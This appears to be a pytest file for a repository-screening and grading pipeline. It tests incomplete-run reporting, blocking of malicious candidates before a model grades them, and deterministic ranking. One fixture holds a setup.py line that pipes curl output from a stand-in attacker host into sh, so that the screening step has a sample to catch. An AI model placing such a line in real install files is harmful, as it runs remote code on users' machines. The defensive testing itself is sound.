"""The seam between stages, which is where an incomplete run turns into a lie.

Every test here is about one claim: a run that could not finish must be
distinguishable from a run that finished and found little.
"""

from __future__ import annotations

import pytest

from gitseed.collect.search import Candidate, CollectResult
from gitseed.grade.types import GradeResult
from gitseed.pipeline.run import PipelineResult, Reviewed, ranked, run

CLEAN = [("main.py", "def add(a, b):\n    return a + b\n")]
MALICIOUS = [("setup.py", "import os\nos.system('curl http://evil.tld/x | sh')\n")]


def candidate(repo: str) -> Candidate:
    owner = repo.split("/")[0]
    return Candidate(repo=repo, owner=owner, html_url=f"https://github.com/{repo}",
                     stars=10, pushed_at="2026-07-01T00:00:00Z")


def grade(idea: int = 7, skill: int = 6) -> GradeResult:
    return GradeResult(idea=idea, skill=skill, description="d", model="m",
                       temperature=0.0, prompt_version="v1")


class Grader:
    def __init__(self, result: GradeResult | None = None, raises: Exception | None = None) -> None:
        self._result = result or grade()
        self._raises = raises
        self.seen: list[str] = []

    def evaluate(self, digest: str) -> GradeResult:
        self.seen.append(digest)
        if self._raises is not None:
            raise self._raises
        return self._result

    def flags_malicious(self, digest: str) -> bool:
        return False


def files_for(mapping: dict[str, list[tuple[str, str]]]):
    def fetch(c: Candidate):
        return mapping[c.repo]
    return fetch


# --- the happy path only proves the plumbing ----------------------------------


def test_a_clean_candidate_is_screened_then_graded() -> None:
    grader = Grader()
    result = run(
        CollectResult(candidates=[candidate("a/one")]),
        fetch_files=files_for({"a/one": CLEAN}),
        grader=grader,
    )
    assert result.complete
    assert len(result.reviewed) == 1
    entry = result.reviewed[0]
    assert entry.grade is not None and entry.withheld is None
    assert entry.score == 13


def test_the_grader_is_not_told_how_popular_the_repository_is() -> None:
    """A grader told a repository has 40k stars is being told the answer."""
    grader = Grader()
    run(CollectResult(candidates=[candidate("a/one")]),
        fetch_files=files_for({"a/one": CLEAN}), grader=grader)
    digest = grader.seen[0]
    assert "10" not in digest.replace("a/one", "")
    assert "2026-07-01" not in digest
    assert "main.py" in digest


# --- an incomplete run must not look like a thin one --------------------------


def test_a_truncated_collection_makes_the_whole_run_incomplete() -> None:
    result = run(
        CollectResult(candidates=[candidate("a/one")], complete=False,
                      stopped_because="rate limit"),
        fetch_files=files_for({"a/one": CLEAN}),
        grader=Grader(),
    )
    assert result.complete is False
    assert "rate limit" in " ".join(result.incomplete_because)


def test_a_complete_run_that_found_nothing_is_still_complete() -> None:
    """The distinction the whole module exists for."""
    result = run(CollectResult(candidates=[]), fetch_files=files_for({}), grader=Grader())
    assert result.reviewed == []
    assert result.complete is True
    assert result.incomplete_because == []


def test_unreadable_files_do_not_end_the_run_but_are_recorded() -> None:
    def fetch(c: Candidate):
        if c.repo == "a/two":
            raise OSError("404")
        return CLEAN

    result = run(
        CollectResult(candidates=[candidate("a/one"), candidate("a/two"), candidate("a/three")]),
        fetch_files=fetch,
        grader=Grader(),
    )
    assert len(result.reviewed) == 3, "one bad repository discarded the others"
    assert result.complete is False
    assert "a/two" in " ".join(result.incomplete_because)
    graded = [e for e in result.reviewed if e.grade is not None]
    assert len(graded) == 2


def test_a_failing_grader_is_recorded_against_that_candidate_only() -> None:
    class Flaky(Grader):
        def evaluate(self, digest: str) -> GradeResult:
            self.seen.append(digest)
            if "a/two" in digest:
                raise RuntimeError("model refused")
            return grade()

    result = run(
        CollectResult(candidates=[candidate("a/one"), candidate("a/two")]),
        fetch_files=files_for({"a/one": CLEAN, "a/two": CLEAN}),
        grader=Flaky(),
    )
    assert result.complete is False
    failed = next(e for e in result.reviewed if e.candidate.repo == "a/two")
    assert failed.grade is None and "model refused" in (failed.withheld or "")
    assert next(e for e in result.reviewed if e.candidate.repo == "a/one").grade is not None


# --- screening decides before a model is ever asked ---------------------------


def test_a_high_severity_candidate_never_reaches_the_grader() -> None:
    """A model that comes back enthusiastic is an argument to override a signal."""
    grader = Grader()
    result = run(
        CollectResult(candidates=[candidate("a/bad")]),
        fetch_files=files_for({"a/bad": MALICIOUS}),
        grader=grader,
    )
    assert grader.seen == []
    entry = result.reviewed[0]
    assert entry.grade is None
    assert entry.severity == "high"
    assert "screening found" in (entry.withheld or "")


def test_a_blocked_candidate_does_not_make_the_run_incomplete() -> None:
    """Screening rejecting something is the pipeline working, not failing."""
    result = run(
        CollectResult(candidates=[candidate("a/bad")]),
        fetch_files=files_for({"a/bad": MALICIOUS}),
        grader=Grader(),
    )
    assert result.complete is True


def test_a_blocked_candidate_is_kept_in_the_output() -> None:
    """Dropping it silently would let the same repository return tomorrow."""
    result = run(
        CollectResult(candidates=[candidate("a/bad")]),
        fetch_files=files_for({"a/bad": MALICIOUS}),
        grader=Grader(),
    )
    assert [e.candidate.repo for e in result.reviewed] == ["a/bad"]
    assert result.reviewed[0].signals != []


# --- ranking ------------------------------------------------------------------


def test_ranked_puts_the_highest_score_first() -> None:
    class Varying(Grader):
        def evaluate(self, digest: str) -> GradeResult:
            return grade(9, 9) if "a/high" in digest else grade(2, 2)

    result = run(
        CollectResult(candidates=[candidate("a/low"), candidate("a/high")]),
        fetch_files=files_for({"a/low": CLEAN, "a/high": CLEAN}),
        grader=Varying(),
    )
    assert [e.candidate.repo for e in ranked(result)] == ["a/high", "a/low"]


def test_an_ungraded_entry_sorts_last_but_is_not_dropped() -> None:
    result = run(
        CollectResult(candidates=[candidate("a/bad"), candidate("a/ok")]),
        fetch_files=files_for({"a/bad": MALICIOUS, "a/ok": CLEAN}),
        grader=Grader(),
    )
    order = [e.candidate.repo for e in ranked(result)]
    assert order == ["a/ok", "a/bad"]


def test_an_ungraded_entry_has_no_score_at_all() -> None:
    """Not a sentinel below the range — no number.

    A sentinel is chosen against the range it sits under. -1 and 0 are both safe
    while `GradeResult` enforces 1..10, and both stop being safe the moment that
    range opens downward, silently. `None` cannot be compared by accident.
    """
    ungraded = Reviewed(candidate=candidate("a/x"), signals=[], severity="none", grade=None)
    assert ungraded.score is None
    assert Reviewed(
        candidate=candidate("a/y"), signals=[], severity="none", grade=grade(1, 1)
    ).score == 2


def test_the_grade_range_that_makes_a_sentinel_unnecessary_is_enforced() -> None:
    with pytest.raises(ValueError):
        grade(0, 0)


def test_ranking_is_total_so_two_runs_agree() -> None:
    class Same(Grader):
        def evaluate(self, digest: str) -> GradeResult:
            return grade(5, 5)

    collected = CollectResult(candidates=[candidate("a/b"), candidate("a/a"), candidate("a/c")])
    first = ranked(run(collected, fetch_files=files_for({"a/a": CLEAN, "a/b": CLEAN, "a/c": CLEAN}), grader=Same()))
    second = ranked(run(collected, fetch_files=files_for({"a/a": CLEAN, "a/b": CLEAN, "a/c": CLEAN}), grader=Same()))
    assert [e.candidate.repo for e in first] == [e.candidate.repo for e in second]
    assert [e.candidate.repo for e in first] == ["a/a", "a/b", "a/c"]


def test_mark_incomplete_keeps_every_reason_in_order() -> None:
    result = PipelineResult()
    result.mark_incomplete("first")
    result.mark_incomplete("second")
    assert result.complete is False
    assert result.incomplete_because == ["first", "second"]
